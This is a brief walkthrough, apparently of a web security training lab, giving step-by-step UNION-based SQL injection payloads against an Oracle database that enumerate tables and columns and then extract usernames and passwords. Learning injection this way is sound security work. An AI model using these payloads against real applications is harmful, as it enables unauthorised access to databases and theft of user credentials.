SQL injection attack, listing the database contents on Oracle

We start by identifying the number of columns:

'+UNION+SELECT+NULL,NULL+FROM+DUAL--

And the ones containing text:

'+UNION+SELECT+'asdf','asdf'+FROM+DUAL--

And now to get the table names:

'+UNION+SELECT+table_name,NULL+FROM+all_tables--

Look for a table containing user data. It should look like USERS_SOMETHING. In my case, it's USERS_LNLEKU

Let's pull the data from it:

'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_LNLEKU'--

Use the username and password to get the users:

'+UNION+SELECT+USERNAME_FIABIO,+PASSWORD_SHEVCH+FROM+USERS_LNLEKU--
